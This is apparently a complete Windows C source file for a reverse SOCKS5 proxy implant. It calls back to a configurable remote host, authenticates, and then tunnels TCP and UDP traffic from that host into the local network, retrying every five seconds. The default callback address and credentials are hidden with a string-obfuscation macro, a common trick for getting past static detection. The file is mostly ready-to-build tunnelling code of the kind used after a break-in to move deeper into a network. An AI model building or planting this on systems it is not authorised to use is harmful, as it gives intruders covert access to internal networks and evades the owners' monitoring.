#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "obfuscate.h"

#pragma comment(lib, "Ws2_32.lib")

#define SERVER_USERNAME   AY_OBFUSCATE("admin")
#define SERVER_PASSWORD   AY_OBFUSCATE("password")
#define SERVER_REMOTE_IP  AY_OBFUSCATE("127.0.0.1")
#define SERVER_REMOTE_PORT 1080

#ifndef IN6ADDR_ANY_INIT
#define IN6ADDR_ANY_INIT { { { 0 } } }
#endif

#ifndef in6addr_any
static const struct in6_addr in6addr_any = IN6ADDR_ANY_INIT;
#endif

#ifndef INET6_ADDRSTRLEN
#define INET6_ADDRSTRLEN 46
#endif

static void PrintError(const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stderr, "[ERROR] ");
    vfprintf(stderr, fmt, args);
    fprintf(stderr, "\n");
    fflush(stderr);
    va_end(args);
}

static void PrintInfo(const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    printf("[INFO] ");
    vfprintf(stdout, fmt, args);
    printf("\n");
    fflush(stdout);
    va_end(args);
}

#define SOCKS5_VERSION          0x05
#define AUTH_METHOD_NO_AUTH     0x00
#define AUTH_METHOD_USERPASS    0x02
#define AUTH_METHOD_NO_ACCEPT   0xFF
#define AUTH_VERSION_USERPASS   0x01
#define SOCKS_CMD_CONNECT       0x01
#define SOCKS_CMD_BIND          0x02
#define SOCKS_CMD_UDP_ASSOCIATE 0x03
#define SOCKS_ADDR_IPV4         0x01
#define SOCKS_ADDR_DOMAIN       0x03
#define SOCKS_ADDR_IPV6         0x04

typedef struct _SOCKS5_SERVER_REV {
    USHORT remote_port;
    char remote_ip[256];
    HANDLE shutdown_event;
    HANDLE thread_handle;
    char login[256];
    char password[256];
} SOCKS5_SERVER_REV;

typedef struct _SOCKS5_CLIENT {
    SOCKET client_socket;
    SOCKS5_SERVER_REV* server;
    struct sockaddr_storage client_addr;
    int client_addr_len;
} SOCKS5_CLIENT;

static int ReadExact(SOCKET sock, char* buffer, int len) {
    int total = 0;
    while (total < len) {
        int n = recv(sock, buffer + total, len - total, 0);
        if (n <= 0) {
            PrintError("ReadExact failed (recv returned %d, expected %d), WSAError=%d", n, len, WSAGetLastError());
            return -1;
        }
        total += n;
    }
    PrintInfo("ReadExact: successfully read %d bytes", total);
    return total;
}

static int SendAll(SOCKET sock, const char* buffer, int len) {
    int total = 0;
    while (total < len) {
        int n = send(sock, buffer + total, len - total, 0);
        if (n == SOCKET_ERROR) {
            PrintError("SendAll failed (send returned SOCKET_ERROR), WSAError=%d", WSAGetLastError());
            return -1;
        }
        total += n;
    }
    PrintInfo("SendAll: successfully sent %d bytes", total);
    return total;
}

static const char* SockAddrToString(const struct sockaddr* sa, char* buf, size_t buf_len) {
    if (sa->sa_family == AF_INET) {
        struct sockaddr_in* sin = (struct sockaddr_in*)sa;
        inet_ntop(AF_INET, &(sin->sin_addr), buf, (socklen_t)buf_len);
    } else if (sa->sa_family == AF_INET6) {
        struct sockaddr_in6* sin6 = (struct sockaddr_in6*)sa;
        inet_ntop(AF_INET6, &(sin6->sin6_addr), buf, (socklen_t)buf_len);
    } else {
        strncpy(buf, "Unknown", buf_len);
    }
    return buf;
}

static BOOL SendSocksReply(SOCKET sock, UCHAR rep, const struct sockaddr* bnd_addr, int bnd_addr_len) {
    char reply[256];
    int offset = 0;
    reply[offset++] = SOCKS5_VERSION;
    reply[offset++] = rep;
    reply[offset++] = 0x00;

    if (bnd_addr && bnd_addr->sa_family == AF_INET) {
        reply[offset++] = SOCKS_ADDR_IPV4;
        struct sockaddr_in* sin = (struct sockaddr_in*)bnd_addr;
        memcpy(reply + offset, &(sin->sin_addr), 4);
        offset += 4;
        memcpy(reply + offset, &(sin->sin_port), 2);
        offset += 2;
    } else if (bnd_addr && bnd_addr->sa_family == AF_INET6) {
        reply[offset++] = SOCKS_ADDR_IPV6;
        struct sockaddr_in6* sin6 = (struct sockaddr_in6*)bnd_addr;
        memcpy(reply + offset, &(sin6->sin6_addr), 16);
        offset += 16;
        memcpy(reply + offset, &(sin6->sin6_port), 2);
        offset += 2;
    } else {
        reply[offset++] = SOCKS_ADDR_IPV4;
        memset(reply + offset, 0, 4);
        offset += 4;
        memset(reply + offset, 0, 2);
        offset += 2;
    }
    if (SendAll(sock, reply, offset) != offset) {
        PrintError("SendSocksReply failed on socket %d", (int)sock);
        return FALSE;
    }
    PrintInfo("SendSocksReply: Sent reply with REP=%d", rep);
    return TRUE;
}

static BOOL ReadSocksAddress(SOCKET sock, UCHAR atyp, struct sockaddr_storage* addr, int* addr_len) {
    memset(addr, 0, sizeof(struct sockaddr_storage));
    if (atyp == SOCKS_ADDR_IPV4) {
        struct sockaddr_in* sin = (struct sockaddr_in*)addr;
        sin->sin_family = AF_INET;
        if (ReadExact(sock, (char*)&sin->sin_addr, 4) != 4)
            return FALSE;
        if (ReadExact(sock, (char*)&sin->sin_port, 2) != 2)
            return FALSE;
        *addr_len = sizeof(struct sockaddr_in);
        PrintInfo("ReadSocksAddress: Read IPv4 address");
        return TRUE;
    } else if (atyp == SOCKS_ADDR_IPV6) {
        struct sockaddr_in6* sin6 = (struct sockaddr_in6*)addr;
        sin6->sin6_family = AF_INET6;
        if (ReadExact(sock, (char*)&sin6->sin6_addr, 16) != 16)
            return FALSE;
        if (ReadExact(sock, (char*)&sin6->sin6_port, 2) != 2)
            return FALSE;
        *addr_len = sizeof(struct sockaddr_in6);
        PrintInfo("ReadSocksAddress: Read IPv6 address");
        return TRUE;
    } else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR domain_len;
        if (ReadExact(sock, (char*)&domain_len, 1) != 1)
            return FALSE;
        char domain[256];
        if (domain_len >= sizeof(domain))
            return FALSE;
        if (ReadExact(sock, domain, domain_len) != domain_len)
            return FALSE;
        domain[domain_len] = '\0';
        uint16_t port_net;
        if (ReadExact(sock, (char*)&port_net, 2) != 2)
            return FALSE;
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portStr[6];
        _snprintf(portStr, sizeof(portStr), "%hu", port_net);
        int err = getaddrinfo(domain, portStr, &hints, &res);
        if (err != 0 || res == NULL) {
            PrintError("ReadSocksAddress: getaddrinfo failed for domain %s: %d", domain, err);
            return FALSE;
        }
        memcpy(addr, res->ai_addr, res->ai_addrlen);
        *addr_len = (int)res->ai_addrlen;
        freeaddrinfo(res);
        if (addr->ss_family == AF_INET) {
            ((struct sockaddr_in*)addr)->sin_port = port_net;
        } else if (addr->ss_family == AF_INET6) {
            ((struct sockaddr_in6*)addr)->sin6_port = port_net;
        } else {
            return FALSE;
        }
        PrintInfo("ReadSocksAddress: Read domain address %s", domain);
        return TRUE;
    }
    return FALSE;
}

static void TcpRelay(SOCKET s1, SOCKET s2) {
    char buffer[4096];
    fd_set read_fds;
    int maxfd = (s1 > s2) ? s1 : s2;
    PrintInfo("TcpRelay: Starting data relay between sockets %d and %d", s1, s2);
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(s1, &read_fds);
        FD_SET(s2, &read_fds);
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        int activity = select(maxfd + 1, &read_fds, NULL, NULL, &tv);
        if (activity == 0)
            continue;
        if (activity < 0) {
            PrintError("TcpRelay: select() failed, WSAError=%d", WSAGetLastError());
            break;
        }
        if (FD_ISSET(s1, &read_fds)) {
            int n = recv(s1, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            if (send(s2, buffer, n, 0) <= 0) break;
        }
        if (FD_ISSET(s2, &read_fds)) {
            int n = recv(s2, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            if (send(s1, buffer, n, 0) <= 0) break;
        }
    }
    closesocket(s1);
    closesocket(s2);
    PrintInfo("TcpRelay: Relay ended, sockets closed");
}

typedef struct _UDP_RELAY {
    SOCKET udp_socket;
    SOCKS5_CLIENT* client;
    struct sockaddr_storage client_udp_addr;
    int client_udp_addr_set;
} UDP_RELAY;

static DWORD WINAPI UDPRelayThread(LPVOID param) {
    UDP_RELAY* relay = (UDP_RELAY*)param;
    char buffer[65536];
    PrintInfo("UDPRelayThread: UDP relay thread started");
    while (1) {
        struct sockaddr_storage src_addr;
        int addr_len = sizeof(src_addr);
        int n = recvfrom(relay->udp_socket, buffer, sizeof(buffer), 0, (struct sockaddr*)&src_addr, &addr_len);
        if (n <= 0) {
            PrintError("UDPRelayThread: recvfrom() failed or connection closed, WSAError=%d", WSAGetLastError());
            break;
        }
        if (n < 4) continue;
        if (buffer[0] != 0x00 || buffer[1] != 0x00) continue;
        UCHAR frag = buffer[2];
        if (frag != 0x00) continue;
        UCHAR atyp = buffer[3];
        int header_len = 0;
        struct sockaddr_storage dest_addr;
        int dest_addr_len = 0;
        memset(&dest_addr, 0, sizeof(dest_addr));
        if (atyp == SOCKS_ADDR_IPV4) {
            header_len = 4 + 4 + 2;
            if (n < header_len) continue;
            struct sockaddr_in* sin = (struct sockaddr_in*)&dest_addr;
            sin->sin_family = AF_INET;
            memcpy(&sin->sin_addr, buffer + 4, 4);
            memcpy(&sin->sin_port, buffer + 8, 2);
            dest_addr_len = sizeof(struct sockaddr_in);
        } else if (atyp == SOCKS_ADDR_IPV6) {
            header_len = 4 + 16 + 2;
            if (n < header_len) continue;
            struct sockaddr_in6* sin6 = (struct sockaddr_in6*)&dest_addr;
            sin6->sin6_family = AF_INET6;
            memcpy(&sin6->sin6_addr, buffer + 4, 16);
            memcpy(&sin6->sin6_port, buffer + 20, 2);
            dest_addr_len = sizeof(struct sockaddr_in6);
        } else if (atyp == SOCKS_ADDR_DOMAIN) {
            UCHAR dlen = buffer[4];
            header_len = 4 + 1 + dlen + 2;
            if (n < header_len) continue;
            char domain[256];
            memcpy(domain, buffer + 5, dlen);
            domain[dlen] = '\0';
            uint16_t port_net;
            memcpy(&port_net, buffer + 5 + dlen, 2);
            struct addrinfo hints, *res = NULL;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_DGRAM;
            if (getaddrinfo(domain, NULL, &hints, &res) != 0 || res == NULL) {
                PrintError("UDPRelayThread: getaddrinfo failed for domain %s", domain);
                continue;
            }
            memcpy(&dest_addr, res->ai_addr, res->ai_addrlen);
            dest_addr_len = (int)res->ai_addrlen;
            freeaddrinfo(res);
            if (dest_addr.ss_family == AF_INET) {
                ((struct sockaddr_in*)&dest_addr)->sin_port = port_net;
            } else if (dest_addr.ss_family == AF_INET6) {
                ((struct sockaddr_in6*)&dest_addr)->sin6_port = port_net;
            } else {
                continue;
            }
        } else {
            continue;
        }
        int data_len = n - header_len;
        char* data = buffer + header_len;
        if (!relay->client_udp_addr_set ||
            (src_addr.ss_family == relay->client_udp_addr.ss_family &&
             memcmp(&src_addr, &relay->client_udp_addr,
                    (src_addr.ss_family == AF_INET ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6))) == 0)) {
            if (!relay->client_udp_addr_set) {
                memcpy(&relay->client_udp_addr, &src_addr, addr_len);
                relay->client_udp_addr_set = 1;
                PrintInfo("UDPRelayThread: Client UDP address set");
            }
            sendto(relay->udp_socket, data, data_len, 0, (struct sockaddr*)&dest_addr, dest_addr_len);
            PrintInfo("UDPRelayThread: Relayed %d bytes to destination", data_len);
        } else {
            char sendbuf[65536];
            int send_offset = 0;
            sendbuf[send_offset++] = 0x00;
            sendbuf[send_offset++] = 0x00;
            sendbuf[send_offset++] = 0x00;
            if (src_addr.ss_family == AF_INET) {
                sendbuf[send_offset++] = SOCKS_ADDR_IPV4;
                struct sockaddr_in* sin = (struct sockaddr_in*)&src_addr;
                memcpy(sendbuf + send_offset, &sin->sin_addr, 4);
                send_offset += 4;
                memcpy(sendbuf + send_offset, &sin->sin_port, 2);
                send_offset += 2;
            } else if (src_addr.ss_family == AF_INET6) {
                sendbuf[send_offset++] = SOCKS_ADDR_IPV6;
                struct sockaddr_in6* sin6 = (struct sockaddr_in6*)&src_addr;
                memcpy(sendbuf + send_offset, &sin6->sin6_addr, 16);
                send_offset += 16;
                memcpy(sendbuf + send_offset, &sin6->sin6_port, 2);
                send_offset += 2;
            }
            memcpy(sendbuf + send_offset, data, data_len);
            send_offset += data_len;
            sendto(relay->udp_socket, sendbuf, send_offset, 0, (struct sockaddr*)&relay->client_udp_addr, sizeof(relay->client_udp_addr));
            PrintInfo("UDPRelayThread: Sent relayed data back to client");
        }
    }
    closesocket(relay->udp_socket);
    free(relay);
    PrintInfo("UDPRelayThread: Exiting UDP relay thread");
    return 0;
}

static BOOL HandleConnect(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    PrintInfo("HandleConnect: Reading reserved byte");
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1)
        return FALSE;
    PrintInfo("HandleConnect: Reading address type");
    if (ReadExact(client->client_socket, (char*)&atyp, 1) != 1)
        return FALSE;
    struct sockaddr_storage dest_addr;
    int dest_addr_len = 0;
    PrintInfo("HandleConnect: Reading destination address");
    if (!ReadSocksAddress(client->client_socket, atyp, &dest_addr, &dest_addr_len)) {
        PrintError("HandleConnect: Failed to read destination address");
        return FALSE;
    }
    PrintInfo("HandleConnect: Creating remote socket");
    SOCKET remote_sock = socket(dest_addr.ss_family, SOCK_STREAM, IPPROTO_TCP);
    if (remote_sock == INVALID_SOCKET) {
        PrintError("HandleConnect: Failed to create remote socket, WSAError=%d", WSAGetLastError());
        return FALSE;
    }
    PrintInfo("HandleConnect: Connecting to destination");
    if (connect(remote_sock, (struct sockaddr*)&dest_addr, dest_addr_len) == SOCKET_ERROR) {
        SendSocksReply(client->client_socket, 0x05, NULL, 0);
        PrintError("HandleConnect: connect() failed, WSAError=%d", WSAGetLastError());
        closesocket(remote_sock);
        return FALSE;
    }
    struct sockaddr_storage local_addr;
    int local_addr_len = sizeof(local_addr);
    if (getsockname(remote_sock, (struct sockaddr*)&local_addr, &local_addr_len) != 0) {
        PrintError("HandleConnect: getsockname() failed, WSAError=%d", WSAGetLastError());
        closesocket(remote_sock);
        return FALSE;
    }
    PrintInfo("HandleConnect: Sending SOCKS reply to client");
    if (!SendSocksReply(client->client_socket, 0x00, (struct sockaddr*)&local_addr, local_addr_len)) {
        PrintError("HandleConnect: SendSocksReply failed");
        closesocket(remote_sock);
        return FALSE;
    }
    PrintInfo("HandleConnect: Starting TCP relay");
    TcpRelay(client->client_socket, remote_sock);
    return TRUE;
}

static BOOL HandleBind(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    PrintInfo("HandleBind: Reading reserved byte");
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1)
        return FALSE;
    PrintInfo("HandleBind: Reading address type");
    if (ReadExact(client->client_socket, (char*)&atyp, 1) != 1)
        return FALSE;
    char dummy[256];
    if (atyp == SOCKS_ADDR_IPV4) {
        if (ReadExact(client->client_socket, dummy, 4) != 4)
            return FALSE;
    } else if (atyp == SOCKS_ADDR_IPV6) {
        if (ReadExact(client->client_socket, dummy, 16) != 16)
            return FALSE;
    } else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR dlen;
        if (ReadExact(client->client_socket, (char*)&dlen, 1) != 1)
            return FALSE;
        if (ReadExact(client->client_socket, dummy, dlen) != dlen)
            return FALSE;
    }
    if (ReadExact(client->client_socket, dummy, 2) != 2)
        return FALSE;
    PrintInfo("HandleBind: Creating bind socket");
    SOCKET bind_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (bind_sock == INVALID_SOCKET)
        bind_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (bind_sock == INVALID_SOCKET) {
        PrintError("HandleBind: Failed to create bind socket, WSAError=%d", WSAGetLastError());
        return FALSE;
    }
    {
        int off = 0;
        setsockopt(bind_sock, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&off, sizeof(off));
    }
    struct sockaddr_storage bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    int bind_addr_len = 0;
    struct sockaddr_in6 sin6;
    memset(&sin6, 0, sizeof(sin6));
    sin6.sin6_family = AF_INET6;
    sin6.sin6_addr = in6addr_any;
    sin6.sin6_port = 0;
    memcpy(&bind_addr, &sin6, sizeof(sin6));
    bind_addr_len = sizeof(sin6);
    PrintInfo("HandleBind: Binding socket");
    if (bind(bind_sock, (struct sockaddr*)&bind_addr, bind_addr_len) == SOCKET_ERROR) {
        PrintError("HandleBind: bind() failed, WSAError=%d", WSAGetLastError());
        closesocket(bind_sock);
        return FALSE;
    }
    PrintInfo("HandleBind: Listening on bind socket");
    if (listen(bind_sock, 1) == SOCKET_ERROR) {
        PrintError("HandleBind: listen() failed, WSAError=%d", WSAGetLastError());
        closesocket(bind_sock);
        return FALSE;
    }
    getsockname(bind_sock, (struct sockaddr*)&bind_addr, &bind_addr_len);
    PrintInfo("HandleBind: Sending first SOCKS reply");
    if (!SendSocksReply(client->client_socket, 0x00, (struct sockaddr*)&bind_addr, bind_addr_len)) {
        PrintError("HandleBind: First SendSocksReply failed");
        closesocket(bind_sock);
        return FALSE;
    }
    SOCKET incoming = accept(bind_sock, NULL, NULL);
    closesocket(bind_sock);
    if (incoming == INVALID_SOCKET) {
        PrintError("HandleBind: accept() failed, WSAError=%d", WSAGetLastError());
        return FALSE;
    }
    struct sockaddr_storage remote_addr;
    int remote_addr_len = sizeof(remote_addr);
    if (getpeername(incoming, (struct sockaddr*)&remote_addr, &remote_addr_len) != 0) {
        PrintError("HandleBind: getpeername() failed, WSAError=%d", WSAGetLastError());
        closesocket(incoming);
        return FALSE;
    }
    PrintInfo("HandleBind: Sending second SOCKS reply");
    if (!SendSocksReply(client->client_socket, 0x00, (struct sockaddr*)&remote_addr, remote_addr_len)) {
        PrintError("HandleBind: Second SendSocksReply failed");
        closesocket(incoming);
        return FALSE;
    }
    TcpRelay(client->client_socket, incoming);
    return TRUE;
}

static BOOL HandleUdpAssociate(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    PrintInfo("HandleUdpAssociate: Reading reserved byte");
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1)
        return FALSE;
    PrintInfo("HandleUdpAssociate: Reading address type");
    if (ReadExact(client->client_socket, (char*)&atyp, 1) != 1)
        return FALSE;
    char dummy[256];
    if (atyp == SOCKS_ADDR_IPV4) {
        if (ReadExact(client->client_socket, dummy, 4) != 4)
            return FALSE;
    } else if (atyp == SOCKS_ADDR_IPV6) {
        if (ReadExact(client->client_socket, dummy, 16) != 16)
            return FALSE;
    } else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR dlen;
        if (ReadExact(client->client_socket, (char*)&dlen, 1) != 1)
            return FALSE;
        if (ReadExact(client->client_socket, dummy, dlen) != dlen)
            return FALSE;
    }
    if (ReadExact(client->client_socket, dummy, 2) != 2)
        return FALSE;
    PrintInfo("HandleUdpAssociate: Creating UDP socket");
    SOCKET udp_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock == INVALID_SOCKET)
        udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock == INVALID_SOCKET) {
        PrintError("HandleUdpAssociate: Failed to create UDP socket, WSAError=%d", WSAGetLastError());
        return FALSE;
    }
    {
        int off = 0;
        setsockopt(udp_sock, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&off, sizeof(off));
    }
    struct sockaddr_storage udp_addr;
    memset(&udp_addr, 0, sizeof(udp_addr));
    int udp_addr_len = 0;
    struct sockaddr_in6 sin6_udp;
    memset(&sin6_udp, 0, sizeof(sin6_udp));
    sin6_udp.sin6_family = AF_INET6;
    sin6_udp.sin6_addr = in6addr_any;
    sin6_udp.sin6_port = 0;
    memcpy(&udp_addr, &sin6_udp, sizeof(sin6_udp));
    udp_addr_len = sizeof(sin6_udp);
    PrintInfo("HandleUdpAssociate: Binding UDP socket");
    if (bind(udp_sock, (struct sockaddr*)&udp_addr, udp_addr_len) == SOCKET_ERROR) {
        PrintError("HandleUdpAssociate: bind() failed for UDP socket, WSAError=%d", WSAGetLastError());
        closesocket(udp_sock);
        return FALSE;
    }
    getsockname(udp_sock, (struct sockaddr*)&udp_addr, &udp_addr_len);
    PrintInfo("HandleUdpAssociate: Sending SOCKS reply for UDP association");
    if (!SendSocksReply(client->client_socket, 0x00, (struct sockaddr*)&udp_addr, udp_addr_len)) {
        PrintError("HandleUdpAssociate: SendSocksReply failed");
        closesocket(udp_sock);
        return FALSE;
    }
    UDP_RELAY* relay = (UDP_RELAY*)malloc(sizeof(UDP_RELAY));
    if (!relay) {
        PrintError("HandleUdpAssociate: malloc failed");
        closesocket(udp_sock);
        return FALSE;
    }
    relay->udp_socket = udp_sock;
    relay->client = client;
    relay->client_udp_addr_set = 0;
    PrintInfo("HandleUdpAssociate: Starting UDP relay thread");
    HANDLE hThread = CreateThread(NULL, 0, UDPRelayThread, relay, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    } else {
        PrintError("HandleUdpAssociate: Failed to create UDPRelayThread, WSAError=%d", WSAGetLastError());
    }
    return TRUE;
}

static BOOL Authenticate(SOCKS5_CLIENT* client) {
    UCHAR greeting[3] = { SOCKS5_VERSION, 1, AUTH_METHOD_USERPASS };
    if (SendAll(client->client_socket, (char*)greeting, 3) != 3)
        return FALSE;
    UCHAR resp[2];
    if (ReadExact(client->client_socket, (char*)resp, 2) != 2 || resp[1] != AUTH_METHOD_USERPASS)
        return FALSE;
    UCHAR ulen = (UCHAR)strlen(client->server->login);
    UCHAR plen = (UCHAR)strlen(client->server->password);
    int total = 0;
    char auth[512];
    auth[total++] = AUTH_VERSION_USERPASS;
    auth[total++] = ulen;
    memcpy(auth + total, client->server->login, ulen);
    total += ulen;
    auth[total++] = plen;
    memcpy(auth + total, client->server->password, plen);
    total += plen;
    if (SendAll(client->client_socket, auth, total) != total)
        return FALSE;
    if (ReadExact(client->client_socket, (char*)resp, 2) != 2 || resp[1] != 0x00)
        return FALSE;
    PrintInfo("Authenticate: OK");
    return TRUE;
}

static DWORD WINAPI ClientHandlerThread(LPVOID param) {
    SOCKS5_CLIENT* client = (SOCKS5_CLIENT*)param;
    __try {
        PrintInfo("ClientHandlerThread: Starting authentication");
        if (!Authenticate(client)) {
            PrintError("ClientHandlerThread: Authentication failed");
            closesocket(client->client_socket);
            free(client);
            return 0;
        }
        UCHAR header[4];
        PrintInfo("ClientHandlerThread: Reading request header");
        if (ReadExact(client->client_socket, (char*)header, 4) != 4) {
            PrintError("ClientHandlerThread: Failed to read request header");
            closesocket(client->client_socket);
            free(client);
            return 0;
        }
        if (header[0] != SOCKS5_VERSION) {
            PrintError("ClientHandlerThread: Unsupported SOCKS version %d", header[0]);
            closesocket(client->client_socket);
            free(client);
            return 0;
        }
        UCHAR cmd = header[1];
        PrintInfo("ClientHandlerThread: Command received: %d", cmd);
        BOOL result = FALSE;
        switch (cmd) {
            case SOCKS_CMD_CONNECT:
                result = HandleConnect(client);
                break;
            case SOCKS_CMD_BIND:
                result = HandleBind(client);
                break;
            case SOCKS_CMD_UDP_ASSOCIATE:
                result = HandleUdpAssociate(client);
                break;
            default:
                SendSocksReply(client->client_socket, 0x07, NULL, 0);
                PrintError("ClientHandlerThread: Unsupported command %d", cmd);
                break;
        }
        closesocket(client->client_socket);
        free(client);
        PrintInfo("ClientHandlerThread: Connection closed");
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        PrintError("ClientHandlerThread: Exception caught, code=0x%08X", GetExceptionCode());
        closesocket(client->client_socket);
        free(client);
    }
    return 0;
}

static DWORD WINAPI ReverseClientThread(LPVOID param) {
    SOCKS5_SERVER_REV* server = (SOCKS5_SERVER_REV*)param;
    PrintInfo("ReverseClientThread: Started");
    while (WaitForSingleObject(server->shutdown_event, 0) != WAIT_OBJECT_0) {
        struct addrinfo hints = {0}, *res = NULL, *ai;
        hints.ai_family   = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portStr[6];
        _snprintf(portStr, sizeof(portStr), "%hu", server->remote_port);
        PrintInfo("Resolving %s:%s", server->remote_ip, portStr);
        if (getaddrinfo(server->remote_ip, portStr, &hints, &res) != 0) {
            PrintError("getaddrinfo failed");
            Sleep(5000);
            continue;
        }
        SOCKET sock = INVALID_SOCKET;
        for (ai = res; ai; ai = ai->ai_next) {
            sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
            if (sock == INVALID_SOCKET) continue;
            PrintInfo("Trying connect() to %s:%s (family=%d)", server->remote_ip, portStr, ai->ai_family);
            if (connect(sock, ai->ai_addr, (int)ai->ai_addrlen) == 0) {
                PrintInfo("Connected successfully");
                break;
            }
            PrintError("connect() failed, WSAError=%d", WSAGetLastError());
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
        freeaddrinfo(res);
        if (sock == INVALID_SOCKET) {
            PrintInfo("All connect attempts failed — retry in 5 seconds");
            Sleep(5000);
            continue;
        }
        SOCKS5_CLIENT* client = (SOCKS5_CLIENT*)malloc(sizeof(*client));
        client->client_socket   = sock;
        client->server          = server;
        client->client_addr_len = 0;
        HANDLE hThread = CreateThread(NULL, 0, ClientHandlerThread, client, 0, NULL);
        if (hThread) CloseHandle(hThread);
        else {
            PrintError("CreateThread failed, WSAError=%d", WSAGetLastError());
            closesocket(sock);
            free(client);
        }
        Sleep(5000);
    }
    PrintInfo("ReverseClientThread: Exiting");
    return 0;
}

SOCKS5_SERVER_REV* StartReverseSocks5(const char* login, const char* password, const char* remote_ip, USHORT remote_port) {
    WSADATA wsaData;
    PrintInfo("StartReverseSocks5: Initializing Winsock");
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        PrintError("StartReverseSocks5: WSAStartup failed");
        return NULL;
    }
    SOCKS5_SERVER_REV* server = (SOCKS5_SERVER_REV*)malloc(sizeof(SOCKS5_SERVER_REV));
    if (!server) {
        PrintError("StartReverseSocks5: malloc failed");
        WSACleanup();
        return NULL;
    }
    memset(server, 0, sizeof(SOCKS5_SERVER_REV));
    server->remote_port = remote_port;
    strncpy(server->remote_ip, remote_ip, sizeof(server->remote_ip) - 1);
    strncpy(server->login, login, sizeof(server->login) - 1);
    strncpy(server->password, password, sizeof(server->password) - 1);
    PrintInfo("StartReverseSocks5: Creating shutdown event");
    server->shutdown_event = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!server->shutdown_event) {
        PrintError("StartReverseSocks5: CreateEventA failed");
        free(server);
        WSACleanup();
        return NULL;
    }
    PrintInfo("StartReverseSocks5: Starting reverse client thread");
    server->thread_handle = CreateThread(NULL, 0, ReverseClientThread, server, 0, NULL);
    if (!server->thread_handle) {
        PrintError("StartReverseSocks5: CreateThread failed, WSAError=%d", WSAGetLastError());
        CloseHandle(server->shutdown_event);
        free(server);
        WSACleanup();
        return NULL;
    }
    PrintInfo("StartReverseSocks5: Reverse SOCKS5 client started - connecting to %s:%d", remote_ip, remote_port);
    return server;
}

VOID StopReverseSocks5(SOCKS5_SERVER_REV* server) {
    if (!server)
        return;
    PrintInfo("StopReverseSocks5: Signaling shutdown event");
    SetEvent(server->shutdown_event);
    WaitForSingleObject(server->thread_handle, 5000);
    CloseHandle(server->shutdown_event);
    CloseHandle(server->thread_handle);
    free(server);
    WSACleanup();
    PrintInfo("StopReverseSocks5: Reverse SOCKS5 client stopped");
}

int main(int argc, char* argv[]) {
    const char* login    = (argc > 1) ? argv[1] : obfuscate_get(SERVER_USERNAME);
    const char* password = (argc > 2) ? argv[2] : obfuscate_get(SERVER_PASSWORD);
    const char* ip       = (argc > 3) ? argv[3] : obfuscate_get(SERVER_REMOTE_IP);
    USHORT port          = (argc > 4) ? (USHORT)atoi(argv[4]) : SERVER_REMOTE_PORT;
    
    SOCKS5_SERVER_REV* server = StartReverseSocks5(login, password, ip, port);
    if (!server) return 1;
    PrintInfo("Running... press Enter to stop");
    getchar();
    StopReverseSocks5(server);
    return 0;
}
